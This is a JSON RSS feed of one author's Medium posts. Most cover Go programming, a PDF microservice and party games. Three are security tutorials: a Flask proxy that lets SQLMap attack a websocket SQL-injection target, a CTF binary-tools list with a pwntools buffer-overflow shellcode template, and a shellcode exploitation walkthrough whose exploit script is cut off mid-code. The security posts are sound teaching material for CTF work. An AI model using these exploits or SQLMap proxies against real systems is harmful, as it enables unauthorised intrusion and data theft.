{
  "channel": {
    "title": "Stories by Francesco Pastore on Medium",
    "description": "Stories by Francesco Pastore on Medium",
    "link": "",
    "image": "\n            \n            \n            \n        ",
    "items": [
      {
        "title": "SQLMap over websockets",
        "link": "https://2h3ph3rd.medium.com/sqlmap-over-websockets-353cdcd9a7ab?source=rss-5a9085122896------2",
        "pubDate": "Wed, 08 Mar 2023 19:17:29 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "penetration-testing",
          "sqlmap",
          "hacking",
          "htb",
          "sqli"
        ],
        "guid": "https://medium.com/p/353cdcd9a7ab",
        "description": "SQLMap is a powerful open-source tool that is widely used for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying SQLi vulnerabilities, determining the type of database, and extracting sensitive information from the database.However, there are some limitations to SQLMap. For instance, it may not support certain types of requests, such as those made over websockets. Additionally, working with complex targets can be challenging using SQLMap alone.In this article, we will explore a possible solution to these issues that requires minimal effort and makes also simpler to work with SQLMap.The ideaTo simplify the process the idea is to set up a fake server as an intermediary. With this approach, SQLMap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target.In this way, SQLMap can be used to test the fake server, which serves as a proxy for the real target. This method can be particularly useful when dealing with complex targets or requests that are not supported by SQLMap.A simple representation of the processPrepare the environmentTo set up the server, we will be using Python along with the Flask and Websocket libraries. To get started, we will create a virtual environment and install the necessary packages using pip.python3 -m venv .venvsource .venv/bin/activatepython3 -m pip install flask websocketOnce the installation is complete, the server can be launched using a simple command. It will be available on localhost by default over the port 5000.flask runThe main serverTo set up the server, all we need to do is define an endpoint that should take one or more query parameters as input and use them to create the request.from flask import Flask, requestfrom websocket import create_connectionapp = Flask(__name__)ws_url = \u0026quot;ws://website.com\u0026quot; # put here the ws base url# it expects a request like /?query=something@app.route(\u0026quot;/\u0026quot;)def handle():    # query is the query param name used by this endpoint    args = request.args    id = args.get(\u0026#39;query\u0026#39;)    ws = create_connection(ws_url)    # in this example, the websocket endpoint    # expects a json with an id parameter    # that is vulnerable to sqli    payload = \u0026#39;{\u0026quot;id\u0026quot;:\u0026quot;%s\u0026quot;}\u0026#39; % id     ws.send(payload)    res = ws.recv()    ws.close()    if res:        return res    else:In this code, the victim is expected to receive a websocket message containing a JSON object with an ID. The server intercepts the SQLMap request, extracts the ID passed as query, and sent it on to the actual target. This allows SQLMap to be used to test the fake server, which serves as a proxy for the real target.It is important to note that the server must be running before SQLMap can be executed. Also, be careful to call this file as “app.py” to make it recognizable by flask. Otherwise, you should change the value of the FLASK_APP environment variable.Run SQLMapTo run SQLMap, you simply need to provide the correct URL that includes the query parameter(s) and SQLMap will take care of the rest.Once SQLMap is executed, it will be able to scan the victim by going through the fake server that we created.sqlmap -u \u0026quot;http://localhost:5000/?query=1\u0026quot; --batch --dbsSummaryFor your convenience, I leave here a Gist that summarizes the key points of this article.https://medium.com/media/baca13a17d430e9b0e80a8dead1fff91/hrefhttps://medium.com/media/98c345148d16c58f2bcd27c683c6896e/href"
      },
      {
        "title": "Table driven testing in Go",
        "link": "https://2h3ph3rd.medium.com/table-driven-testing-in-go-c6816ac32448?source=rss-5a9085122896------2",
        "pubDate": "Tue, 28 Feb 2023 20:39:59 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "go",
          "table-driven-testing",
          "programming",
          "test",
          "golang"
        ],
        "guid": "https://medium.com/p/c6816ac32448",
        "description": "Testing your code is a crucial step in the development process. However, it can become cumbersome and time-consuming, especially when dealing with a large number of test cases. Manually copying and pasting code to test each case is not an clean solution.In this article we will look to table driven tests in Go to write your test in a fast and efficient way. This approach offers several benefits, including faster test writing, easier maintenance, and improved test coverage.Why a table?Table-driven testing is an approach that allows us to define and execute multiple test cases in a straightforward way. The idea is to create a “table” made up of an array of structs, where we can store the input, expected output, and any other relevant information for each test case.tests := []struct {  // parameter  param1 int  param2 string  param3 interface{} // useful for complex values  // ...  // results  expected1 string  expected2 int  // ...  err error }{}Once we have defined our test cases, we can iterate over the array and execute the function under test for each input, verifying that the actual output matches the expected output for each case.for _, test := range tests {  actual := function(test.param)  assert.Equal(t, test.expected, actual)}By using this approach, we can write more concise and maintainable test code that covers a wide range of scenarios. We can also easily extend our test suite by adding new test cases to the table, without having to duplicate test code or write new test functions.While it may require some initial effort, this method can ultimately simplify and streamline your code, making it cleaner and more readable.A simple exampleConsider a function that takes in input an email and checks if it is valid or not by returning a boolean.package mainimport ( \u0026quot;regexp\u0026quot;)// CheckEmail returns true if the given string is a valid email, otherwise falsefunc CheckEmail(email string) bool { pattern := `^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$` reg := regexp.MustCompile(pattern) return reg.MatchString(email)}In this case of testing a function that takes an email address as input and returns a boolean, we can define a struct with two fields: one for the email input and one for the expected boolean output.In testing, it’s common to compare an “actual” value (the value returned by the function under test) with an “expected” value (the value we expect the function to return given a specific input).package mainimport ( \u0026quot;fmt\u0026quot; \u0026quot;testing\u0026quot; \u0026quot;github.com/stretchr/testify/assert\u0026quot;)func TestCheckEmail(t *testing.T) { tests := []struct {  email    string  expected bool }{  {\u0026quot;email@email.com\u0026quot;, true},  {\u0026quot;123@email.com\u0026quot;, true},  {\u0026quot;email_email_email@email.com\u0026quot;, true},  {\u0026quot;email.email.email@email.com\u0026quot;, true},  {\u0026quot;email!@email.com\u0026quot;, false},  {\u0026quot;email@email\u0026quot;, false},  {\u0026quot;email\u0026quot;, false},  {\u0026quot;@email.com\u0026quot;, false},  {\u0026quot;@email\u0026quot;, false}, } for i, test := range tests {  actual := CheckEmail(test.email)  msg := fmt.Sprintf(\u0026quot;test %d with email %s\u0026quot;, i, test.email)  assert.Equal(t, test.expected, actual, msg) }}Indeed, as you can see in this example, we can test multiple cases in just a few lines of code by using the table-driven approach. This technique can save us time and effort while ensuring that our tests cover a wide range of scenarios.Moreover, adding a new test case is straightforward since all we have to do is add a new entry to the array, with the input and the expected output.This way, we can easily extend our test suite and cover more edge cases, without having to write additional test functions or duplicating code. By using the table-driven approach, we can keep our test code clean, concise, and maintainable, which can save us time and effort in the long run.Add a custom messageIt is possible to add an additional field to the struct for a custom message to be shown in case of an error. This can be particularly useful when debugging failures or identifying issues within your tests.For example, suppose we want to add a custom error message to the test case we previously discussed. In that case, we could modify the struct to include a field with a descriptive error message that will be displayed if the test fails.func TestCheckEmailWithMessage(t *testing.T) { tests := []struct {  email    string  expected bool  message  string }{  {\u0026quot;email@email.com\u0026quot;, true, \u0026quot;standard email\u0026quot;},  {\u0026quot;123@email.com\u0026quot;, true, \u0026quot;numbers should be accepted\u0026quot;},  {\u0026quot;email_email_email@email.com\u0026quot;, true, \u0026quot;underscores should be accepted\u0026quot;},  {\u0026quot;email.email.email@email.com\u0026quot;, true, \u0026quot;dots should be accepted\u0026quot;},  {\u0026quot;email!@email.com\u0026quot;, false, \u0026quot;special character not allowed\u0026quot;},  {\u0026quot;email@email\u0026quot;, false, \u0026quot;bad domain given\u0026quot;},  {\u0026quot;email\u0026quot;, false, \u0026quot;no domain given\u0026quot;},  {\u0026quot;@email.com\u0026quot;, false, \u0026quot;no username given\u0026quot;},  {\u0026quot;@email\u0026quot;, false, \u0026quot;no username and bad domain given\u0026quot;}, } for _, test := range tests {  actual := CheckEmail(test.email)  assert.Equal(t, test.expected, actual, test.message) }}Handle a lot of parametersWhen dealing with a large number of parameters, it can become challenging to manage them effectively. In such situations, creating multiple structs, each designed to handle a specific aspect of the problem, can be a better approach. These structs can be organized as separate arrays with the same number of elements, simplifying their management.This technique can prove especially helpful when mocking an interface, where numerous methods are called by the function under test. By dividing the parameters into multiple structs, you can improve the organization and readability of your code, making it easier to maintain and debug.func TestMultipleStructs(t *testing.T) { func1 := []struct {  param  string  result int  err    error }{} func2 := []struct {  param1 time.Time  param2 string  result string  err    error }{} tests := []struct {  param    int  expected string  err      error }{} // check same number of test cases assert.Len(t, func1, len(func2)) for i := range func1 {  // do something with func1[i]  f1 := func1[i]  mock.Interface.EXPECT().Func1(f1.param).Return(f1.result, f1.err)  // do something with func2[i]  f2 := func2[i]  mock.Interface.EXPECT().Func2(f2.param1, f2.param2).Return(f2.result, f2.err)  // check result  test := tests[i]  actual, err := FunctionToTest(test.param)  assert.Equal(t, test.expected, actual)  if test.err == nil {   assert.Nil(t, err)  } else {   assert.EqualError(t, err, test.err.Error())  } }}The next time you write a test, consider how you can structure it with the table driven approach. Overall, taking the time to structure your tests in this way can lead to more robust and reliable code, making it a worthwhile investment in the quality of your software."
      },
      {
        "title": "Five web frameworks for Go",
        "link": "https://2h3ph3rd.medium.com/five-web-frameworks-for-go-3b9036b319ff?source=rss-5a9085122896------2",
        "pubDate": "Thu, 09 Feb 2023 21:00:45 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "api",
          "web-development",
          "go",
          "golang",
          "web-framework"
        ],
        "guid": "https://medium.com/p/3b9036b319ff",
        "description": "Go is becoming one of the most widely used languages for creating APIs because of its simplicity and speed. In fact, compared to other languages such as Python or Javascript, a Go program is strongly and statically typed, and compiled directly, allowing for higher performance.There are many web frameworks available for Go, in this article we will look at five of the most popular ones.GinGin is a highly popular web framework (66K stars on Github!) for the Go programming language, known for its simplicity and speed. Its popularity makes it a common choice for new projects with a long-term vision.Gin provides a variety of interfaces and structures to simplify development, such as the specific gin context and a streamlined middleware structure. However, it may take some time for developers familiar with the standard net/http package to fully understand and utilize all of Gin’s features.ProFast and lightweightActive communityConsDifferent than net/httpHigh learning curvepackage mainimport \u0026quot;github.com/gin-gonic/gin\u0026quot;func main() { r := gin.Default() r.GET(\u0026quot;/ping\u0026quot;, func(c *gin.Context) {  c.JSON(200, gin.H{   \u0026quot;message\u0026quot;: \u0026quot;pong\u0026quot;,  }) }) r.Run() // listen and serve on 0.0.0.0:8080}Gin Web FrameworkGitHub - gin-gonic/gin: Gin is a HTTP web framework written in Go (Golang). It features a Martini-like API with much better performance -- up to 40 times faster. If you need smashing performance, get yourself some Gin.FiberFiber is a web framework for Go that is built on the fasthttp package, making it faster than other frameworks. However, this also comes with some drawbacks.Because fasthttp is relatively new and not fully developed like the net/http package, currently it has several shortcomings, such as support for HTTP/2. If you are considering using this framework, it is important to consider whether the features provided are sufficient for your project needs.ProFastWell documentedA lot of middlewares availableConsNo HTTP/2 supportfasthttp is not fully completed as net/httppackage mainimport \u0026quot;github.com/gofiber/fiber/v2\u0026quot;func main() {    app := fiber.New()    app.Get(\u0026quot;/\u0026quot;, func(c *fiber.Ctx) error {        return c.SendString(\u0026quot;Hello, World 👋!\u0026quot;)    })    app.Listen(\u0026quot;:3000\u0026quot;)}FiberGitHub - gofiber/fiber: ⚡️ Express inspired web framework written in GoGo ChiGo Chi is a less well-known web framework for Go, but its simplicity, lightweight structure, and speed make it a solid choice for web development. Also, its similarities to the now-archived Gorilla/mux project have made it a popular substitute.The framework has well-written documentation and a variety of out-of-the-box middlewares such as JWT authentication, logging, and rate limiting. All of these features make Chi a good option for your next web project.ProNo external dependenciesFully compatible with standard net/http package but…Cons… sometimes could be too verboseMaintenance is not high at the moment.package mainimport (    \u0026quot;net/http\u0026quot;    \u0026quot;github.com/go-chi/chi/v5\u0026quot;    \u0026quot;github.com/go-chi/chi/v5/middleware\u0026quot;)func main() {    r := chi.NewRouter()    r.Use(middleware.Logger)    r.Get(\u0026quot;/\u0026quot;, func(w http.ResponseWriter, r *http.Request) {        w.Write([]byte(\u0026quot;Hello World!\u0026quot;))    })    http.ListenAndServe(\u0026quot;:3000\u0026quot;, r)}go-chi docsGitHub - go-chi/chi: lightweight, idiomatic and composable router for building Go HTTP servicesEchoEcho is a web framework for Go that is designed for high performance and ease of use. It is built on top of the net/http package and a structure very similar to Gin.Echo also provides a wide range of built-in middleware for tasks such as logging, recovery, and CORS, as well as support for custom middleware. It is also extensible and has support for template rendering, WebSockets, and HTTP/2.ProA big collection of middlewaresConsNot so popular as Ginpackage mainimport ( \u0026quot;net/http\u0026quot;  \u0026quot;github.com/labstack/echo/v4\u0026quot;)func main() { e := echo.New() e.GET(\u0026quot;/\u0026quot;, func(c echo.Context) error {  return c.String(http.StatusOK, \u0026quot;Hello, World!\u0026quot;) }) e.Logger.Fatal(e.Start(\u0026quot;:1323\u0026quot;))}RevelRevel is a web framework that is built around the Model-View-Controller architecture. This makes it a great choice for projects that adhere to this design pattern, but it may not be the best fit for others.Additionally, Revel offers hot reloading and an excellent documentation. However, it lacks some important elements for a MVC framework like an ORM or an advanced template engine.ProHot reloadingGood documentationMVC support but…Cons… if you don’t use MVC it could be troublesomeORM must be installed manually if neededFew middlewares available (what about a rate limiter or a jwt auth middleware?)RevelGitHub - revel/revel: A high productivity, full-stack web framework for the Go language.I hope this article has been useful for your next Go project. There are many web frameworks out there; here we have reviewed just five of the most popular ones."
      },
      {
        "title": "The all-in-one microservice to manage PDF",
        "link": "https://2h3ph3rd.medium.com/the-all-in-one-microservice-to-manage-pdf-in-your-app-7fe2e8178391?source=rss-5a9085122896------2",
        "pubDate": "Sun, 27 Nov 2022 09:41:17 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "microservices",
          "go",
          "api",
          "backend",
          "pdf"
        ],
        "guid": "https://medium.com/p/7fe2e8178391",
        "description": "PDF is one of the most common ways used to share data. It is mainly chosen for portability because a PDF file structure does not change between different systems.Working with PDF in your app could not be a piece of cake. Some languages do not have good libraries and conversions between different file types are not so easy. Don’t worry, Gotenberg can help!Wait, what is Gotenberg?Gotenberg is a microservice written in Go and made to be run as a docker container in your server. It allows managing PDF easily by using its very straightforward API.In this article, we will some examples of interactions with Gotenberg, but first, how can we start using it?Gotenberg | GotenbergInstallationGotenberg can be run easily by using the official Docker image from Docker Hub.docker run --rm -p 3000:3000 gotenberg/gotenberg:7One line and everything is readyThere is also a live demo available with some limitations. Look to the official documentation for more details about it.🔥 Live Demo | GotenbergPDF merge? No problem!If you need to merge multiple PDF files you can call the endpoint by doing a POST request with the files passed inside the body. Remember to use form files available in every HTTP request library.curl --request POST \u0026#39;http://localhost:3000/forms/pdfengines/merge\u0026#39; \\  --form \u0026#39;files=@\u0026quot;./sample1.pdf\u0026quot;\u0026#39; \\  --form \u0026#39;files=@\u0026quot;./sample2.pdf\u0026quot;\u0026#39; \\  -o merged.pdfOfficial docsThere are a lot of features available like Office files to PDF or markdown to PDF. Look to the documentation for all the details about them and the ones shown here.About | GotenbergCustom HTML file to PDFcurl \\--request POST \u0026#39;http://localhost:3000/forms/chromium/convert/html\u0026#39; \\--form \u0026#39;files=@\u0026quot;./index.html\u0026quot;\u0026#39; \\-o my.pdfPublic website URL to PDFcurl \\--request POST \u0026#39;http://localhost:3000/forms/chromium/convert/url\u0026#39; \\--form \u0026#39;url=\u0026quot;https://www.google.com\u0026quot;\u0026#39; \\-o my.pdfOne note about authenticationPay attention to authentication, it is better to make Gotenberg available only to the internal network. Otherwise, you could add special endpoints to your back end that allows accessing the pod from the Internet.In every case remember that Gotenberg has no authentication service, so be careful of whom can access it.Gotenberg can be a big help in your applications if you need to manage PDFs. Give it a try and let me know if you find it useful!"
      },
      {
        "title": "Ten resources for binary challenges",
        "link": "https://2h3ph3rd.medium.com/ten-resources-for-binary-challenges-d9c22b8d87a6?source=rss-5a9085122896------2",
        "pubDate": "Sun, 27 Nov 2022 08:58:53 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "buffer-overflow",
          "pwn",
          "ctf",
          "exploitation",
          "binary"
        ],
        "guid": "https://medium.com/p/d9c22b8d87a6",
        "description": "Binary challenges are one of the most common types of CTF. Usually, they require you to analyze a binary and exploit some vulnerabilities.There are a lot of tools out there, and in this article, we will see ten of them that you can’t miss during your exploitation. Without these resources, resolving binary challenges would not be the same.1. pwntoolspwntools is a python package that allows you to write exploits faster. It gives a lot of utilities that can help you to write code during binary challenges.Here you can see a simple exploit for shellcode exploitation with a buffer overflow vulnerability.#!/usr/bin/env python3import sysfrom pwn import *if \u0026quot;--remote\u0026quot; in sys.argv:    p = remote(\u0026quot;url\u0026quot;, 1337)else:    p = process(\u0026quot;./path_to_binary\u0026quot;)if \u0026quot;--debug\u0026quot; in sys.argv:    context.terminal = [\u0026quot;gnome-terminal\u0026quot;]    gdb.attach(p, \u0026quot;\u0026quot;\u0026quot;    b *0x\u0026lt;breakpoint_address\u0026gt;    c    \u0026quot;\u0026quot;\u0026quot;)shellcode = asm(\u0026quot;\u0026quot;\u0026quot;mov rax, 0x3bmov rdi, \u0026lt;buffer_address\u0026gt;mov rsi, 0mov rdx, 0syscall\u0026quot;\u0026quot;\u0026quot;, arch=\u0026#39;amd64\u0026#39;)payload = \u0026quot;A\u0026quot; * 64payload += shellcodep.sendline(payload)p.interactive()pwntools - pwntools 4.8.0 documentation2. pwndbgpwndbg helps to make gdb more accessible by adding powerful commands and a better interface. Each address is printed with a different color to indicate which part of the memory it is relative to. Also, the context that is shown at every breakpoint helps to take a quick look at the current state of the execution.An example of context with pwndbgGitHub - pwndbg/pwndbg: Exploit Development and Reverse Engineering with GDB Made Easy3. GhidraDeveloped by the NSA, Ghidra is one of the most used tools for reverse engineering. Also, it is completely open source and free to use.An example of a binary disassembled with GhidraGhidra4. ref.x86asm.netIn some challenges, it could be fundamental to know which is the code for every possible assembly operation available. You can find a list with a lot of details about each instruction on this website. There is also written what is the meaning of each byte and the possible ways to use each operation.INC of a 32 bit register is coded as 40 + the number of the registerX86 Opcode and Instruction Reference5. defuse.caIt could be a mess to compile assembly code, but don’t worry, this website can help you! You can write a list of assembly instructions and see the compilation result for x86 and x64. Also, there are multiple representations available like string literal or raw hex to easily copy and paste the result into your code.Example of assembly compilerOnline x86 and x64 Intel Instruction Assembler6. syscall.shThere are a lot of available lists on the internet, but this one can beat them all. The URL can be memorized easily and with one click you can look at x86, x64, arm, and arm64 syscalls details. Furthermore, there is also a public API that you could call in your scripts!The execve definition in x64Linux System Calls quick and easy7. how2heapHeap exploitation is one of the most complex types of challenges in the binary field. The goal is usually to exploit the logic behind heap management. This means that is fundamental to know how malloc, calloc, and free works and also the cleaning systems like the t-cache and the different types of bins.how2heap has a lot of examples of how to exploit different heap vulnerabilities. Each example has a C code that explains the attack. This allows you to build the code and run it with a debugger to look carefully at all the operations done. Thanks to this tool heap exploitation become more accessible for everyone.A simple example for a fast bin attackGitHub - shellphish/how2heap: A repository for learning various heap exploitation techniques.8. ngrokSometimes, you could need to obtain a reverse shell by using sockets or send data to a self-hosted API. The big problem in this situation is that you need to know your IP and your firewall must allow external connections.In these cases, ngrok can help. It makes public a port of your host that you decide and it gives an URL. You only need to connect to the given URL and everything works. One line and your service hosted on your computer will be available on the internet.An http server accessible locally at port 3000 with a public linkngrok - Online in One Line9. preenypreeny is a set of libraries that can be used to avoid the execution of anti-debugging functions like alarm or fork. You only need to run your binary by prepending the string LD_PRELOAD=./path/to/preeny and you are done.Example of usage to remove socket connections from a binaryGitHub - zardus/preeny: Some helpful preload libraries for pwning stuff.10. pwninitUsually, every challenge requires some common operation to be done at the beginning. For example, you could download the same libc version of the binary and then patch it. pwninit can help by automatizing the first operations that usually are done. Next time try giving pwninit a chance to start exploitation.pwinit searches by default for a binary called hunter and makes a patched version of it. It creates also a basic initial script that can be used to begin exploitation.Example of pwninit with a binary called hunterGitHub - io12/pwninit: pwninit - automate starting binary exploit challengesI think that these ten tools are very helpful for every binary challenge. Give them a try and let me know in the comments if you find them useful.Good pwning! 👨‍💻"
      },
      {
        "title": "Why you should leave Gorilla and start using Fiber instead",
        "link": "https://2h3ph3rd.medium.com/why-you-should-leave-gorilla-and-start-using-fiber-instead-35093c6f6e77?source=rss-5a9085122896------2",
        "pubDate": "Sat, 12 Nov 2022 18:11:31 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "go",
          "fiber",
          "backend",
          "rest",
          "golang"
        ],
        "guid": "https://medium.com/p/35093c6f6e77",
        "description": "Gorilla is one of the most used Go libraries to develop REST API. It is very simple to use and it makes the standard net/http library more accessible.In a big project, it could help to use a more clean and optimized framework that hides unuseful complexity. This is where Fiber can help!FiberFast, fast, and again fast!On the homepage of the Fiber documentation, you can see a comparison between the most common Go frameworks like Gin, Martini, and Negroni. Fiber is one of the best, thanks to the fasthttp package under the hood that is much faster than the standard net/http package.fasthttp package has the best performanceThe documentation is well written, yes it is possible!If you have developed with Go for some time you have already accepted that the language is relatively new. So, also the libraries that have been made.Usually, the documentations are a work in progress and there is not enough information to use the library properly.Fortunately, this is not the case. The Fiber docs contain everything fundamental you could need and it is really well written.The homepage of the official Fiber docsMiddleware in one lineIf you take a look at the documentation of Fiber you can see that there are a lot of middlewares available.MiddlewareFor example, to add a rate limiter to your app you have to simply add this line.app.Use(limiter.New())A rate limiter will be added to your app with the default settings. With a single line your worries are at ease.One context to rule them allUsually, you have to manage a lot of parameters like an http request and response, a parsed token, or other additional stuff your logic could need. Fiber simplify this by using a single variable called Context where everything is put in it. Your function will have only to take as input a parameter and it will have access to everything it could need.app.Get(\u0026quot;/\u0026quot;, func (c *fiber.Ctx) error {  c.AllParams()  c.Cookies(\u0026quot;name\u0026quot;)  c.IPs()  c.Query(\u0026quot;order\u0026quot;)  // ...  return c.Send([]byte(\u0026quot;Hello, World!\u0026quot;))})Error handling is a piece of cake.Your app should return a valid response even if an error occurs. Managing them could be difficult, but even for this problem Fiber has a solution.You can return a specific fiber error with a status code and a message and everything will be taken care of by Fiber itself. Like a piece of cake!app.Get(\u0026quot;/\u0026quot;, func(c *fiber.Ctx) error {  return fiber.NewError(fiber.StatusServiceUnavailable, \u0026quot;On vacation!\u0026quot;)})I hope that you will give a chance to Fiber for your next project. Let me know if you like it!"
      },
      {
        "title": "Five tips on how to use Gorm better",
        "link": "https://2h3ph3rd.medium.com/five-tips-on-how-to-use-better-gorm-90f42d37aa20?source=rss-5a9085122896------2",
        "pubDate": "Tue, 01 Nov 2022 09:53:00 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "gorm",
          "tips",
          "orm",
          "golang",
          "go"
        ],
        "guid": "https://medium.com/p/90f42d37aa20",
        "description": "Gorm is one of the most used ORM for the Go language. It is complete and very easy to use. But sometimes the documentation does not cover all the case.There are some functionalities that once known can help you to write better code and simplify your work. Let see five tips on how to use Gorm better.Use custom foreign key constraintsWhen you create relations between tables remember to update the constraints on the foreign keys. As default, Gorm set the mode “NO ACTION” for update and delete cases.However, you could make your life easier by using specific modes like for example the “CASCADE” one. Every time a primary key is updated also the relative foreign key will be too. Instead, if a referenced record is deleted also the rows that reference it will be deleted as well.In PostgreSQL the available constraints are:SET NULL: set the foreign key to nullCASCADE: do the same action as done on the referenced row.SET DEFAULT: set the foreign key to the default value (null or empty if not specified)NO ACTION and RESTRICT: in few words, they do not allow some operations on the referenced row. Look to the documentation to read more details about them.5.4. ConstraintsAn example of specific constraints defined on the model.Has OneNot using debug when stuckedOne of the most easier way to find errors is to use the inner debug utility available with Gorm. You just need to prepend “. Debug()” to your function call and you are done! Now, all the queries will be executed as before but in addition the statement is printed.db.Debug().Table(\u0026quot;users\u0026quot;).Select(\u0026quot;users.name, emails.email\u0026quot;).Joins(\u0026quot;left join emails on emails.user_id = users.id\u0026quot;).Scan(\u0026amp;results)SessionJoins and PreloadOne of the most useful feature of Gorm is the automatically management of relations. The functions “Preload” and “Join” help to do this, but when is better to use one or the other?Joins is optimized for one to one relation and it makes the query faster by directly adding the join to the query. Preload instead can be used in any case, but it first reads all the records and then manually updating the relations in the final result.db.Preload(\u0026quot;Orders\u0026quot;).Find(\u0026amp;users)db.Joins(\u0026quot;Company\u0026quot;).Joins(\u0026quot;Manager\u0026quot;).Joins(\u0026quot;Account\u0026quot;).First(\u0026amp;user, 1)// You can\u0026#39;t do this!// db.Joins(\u0026quot;Orders\u0026quot;).Find(\u0026amp;users)// because an user can have more than one orderPreloading (Eager Loading)Find and FirstFind and first are both used to retrieve data, but there is a big difference between them about how they handle errors. By using “Find”, if no value is found an error is raised. Instead, if no rows are retrieved with “First” nothing happen. The value returned will be empty and the error nil.db.First(\u0026amp;user) // an error is raised it the table is emptydb.Limit(1).Find(\u0026amp;user) // no errorQueryAutoMigrate your model to have always the last versionWhile working on your project it could happen that a new table or column are needed. Take track of new changes can be difficult, but for this case Gorm provides the Migrate function.This function takes in input the model to create new tables and update the database accordingly. The approach is conservative, Gorm only does additions or updates of new functionalities.db.AutoMigrate(\u0026amp;User{}, \u0026amp;Product{}, \u0026amp;Order{})Migration"
      },
      {
        "title": "Ten online party games to play for free with your friends",
        "link": "https://2h3ph3rd.medium.com/ten-online-party-games-to-play-for-free-with-your-friends-b28c3300891e?source=rss-5a9085122896------2",
        "pubDate": "Sat, 15 Oct 2022 07:23:20 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "games",
          "discord",
          "online",
          "friends",
          "party"
        ],
        "guid": "https://medium.com/p/b28c3300891e",
        "description": "You are on Discord or at home with your friends and you want to play a game but you don’t have any board game with you. Don’t worry!Fortunately, there are a lot of online party games that you and your friends can play online for free. You only need a device and an Internet connection.SpyfallYou are FBI detectives but one of you is a spy. Each player has a photo of the round location while the spy has multiple ones. The goal is to find the spy before it founds out the correct location!SpyfallCodenamesCodenames is guessing words game played in two teams. Each team must decide a spymaster while the others are field operative. Only the spymasters know which words their teams must guess.Codenames - Play with your Friends OnlineHow to play Codenames | Official Rules | UltraBoardGamesTabooAnother two team game about guessing words. This time is the classic Taboo. In each round, one person per team has to help their teammates guess a word without using the “taboo” ones. The winner is the team who guess more words.Taboo!Secret HitlerSecret Hitler will make you lie and betray your friends. There are two teams that are chosen randomly by the game. In simple terms, the goal of the “good” ones is to make a certain number of “good” policies to pass while the other to elect the dictator. There are a lot of different versions out there, will you be Hitler, Voldemort or Palpatine?Secret Hitler OnlineSecret VoldemortSecret SithSkribblIn Skribbl, like Pictionary, one person per turn has to draw a word and others have to guess it to gain points.skribbl - Free Multiplayer Drawing \u0026amp; Guessing GameGarticAnother Pictionary like game.Gartic.io - Draw, Guess, WINGartic PhoneA telephone game in which each user has to draw something written by someone else and make other guessing it.Gartic Phone - The Telephone GameCoup onlineA peculiar game in which there are multiple influences with different abilities. Each player starts with two of them and their goal is to be the last with at least one influence. See the official rules for more details.Coup OnlineDecryptrA Decrypto like game in which each team has to guess the coded messages presented to them by other members while cracking the codes they intercept from the opposing team.DecryptrI hope that you have found some games to play with your friends.If you know other games that should be added don’t hesitate to write them in the comments!"
      },
      {
        "title": "Basic shellcode exploitation",
        "link": "https://2h3ph3rd.medium.com/basic-shellcode-exploitation-1e9ff274a194?source=rss-5a9085122896------2",
        "pubDate": "Sun, 09 Oct 2022 16:39:44 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "challenge",
          "shellcode",
          "assembly",
          "binary",
          "ctf"
        ],
        "guid": "https://medium.com/p/1e9ff274a194",
        "description": "Shellcode is one of the main techniques used in binary challenges, usually to obtain a reverse shell.In this tutorial we will see what is a shellcode and how to use it by looking to a simple example.But first there are some questions to ask.Shellcode, syscall and other awesome stuffWhat is a shellcode?A shellcode is a sequence of assembly instructions. Usually it is inserted in memory and then executed by exploiting a vulnerability.It is called shellcode because at the beginning it was used only to obtain a shell. Nowadays, shellcode are used to execute whatever sequence of instructions.When is it useful to use a shellcode?A shellcode is useful when you have a vulnerability but nothing to use inside the binary. For example, you could have found a buffer overflow but there isn’t any function to call.What is it necessary for a shellcode exploit?To write a shellcode you need an executable place in memory and you must know the start address of it. It could be everywhere and the address could be leaked during the execution.Furthermore, you must have a vulnerability that allows the shellcode to be executed.How to obtain a reverse shell?To obtain a reverse shell is enough to execute an execve syscall.The path parameter must be a pointer to the binary path that we want to execute like the string /bin/sh\\0.int execve(const char *pathname, char *const argv[], char *const envp[]);pathname The path for the executable to be run, usually a pointer to the string `/bin/sh\\0`argv Command line parametersenvp Environmental variablesUse man execve to get more detailsSyscall in linuxTo understand shellcode it is fundamental know the basics of system calls in Linux.There are some difference between 32 bit and 64 bit executables. So, always be careful with the version of the binary. An easy way to find out is to used the linux file utility.In 32 bit the instruction to do a syscall is int 0x80.You have to put in the register eax the code of the syscall that you want to write.The registers ebx, ecx and edx are respectively the first, the second and the third parameter.mov eax, 0xb              # execve code in x86mov ebx, \u0026lt;address of “/bin/sh\\0”\u0026gt;mov ecx, 0mov edx, 0int 0x80In 64 bit instead, the instruction to use is syscall.The register rax is where to put the code, while rdi, rsi and rdx are the register for the parameters.mov rax, 0x3b              # execve code in x64mov rdi, \u0026lt;address of \u0026quot;/bin/sh\\0\u0026quot;\u0026gt;mov rsi, 0mov rdx, 0syscallA simple exampleThe codeAt the end of this article you can find a valid solution and the original code.#include \u0026lt;stdio.h\u0026gt;void read_buf(char *buf){    printf(\u0026quot;Please write something: \u0026quot;);    read(0, buffer, 0x80); // here there is a buffer overflow    return;}void print_buf(char *buf){    printf(\u0026quot;You write: %s\\n\u0026quot;, buf);    return;}void user_input(){    char buf[80];    read_buf(buf);    print_buf(buf);}int main(){    user_input();    return 0;}Here you can find a builded version without protectionsAnalysisFirstly, we have to check for possible vulnerabilities inside the binary. We can see that the code is very straightforward. The program reads something from input and then it writes it on standard output.By looking carefully we see that the input is managed by a read with a number of bytes equals to 0x80. However, the buffer is long 80 bytes so we have here a buffer overflow vulnerability.The exploitWe can write the shellcode inside the buffer and then use the buffer overflow to overwrite the return address of the function user_input.The goal is to substitute it with the address of the buffer. But first, we have to find out what is this address.A possible way is to use gdb and look to the stack. The address for the breakpoint can be obtained using the command disass user_input. A good point could be right after the read.After that, we need only to insert 80 characters and print out the stack.We can see the saved ebp and saved eip right after the buffer.Here the final script#!/bin/python3from pwn import *from pwn import p64p = process(\u0026quot;./shellcode\u0026quot;)buffer_address = 0x7fffffffdf00 # this could change, use gdbshellcode = asm(\u0026quot;\u0026quot;\u0026quot;mov rax, 0x3bmov rdi, 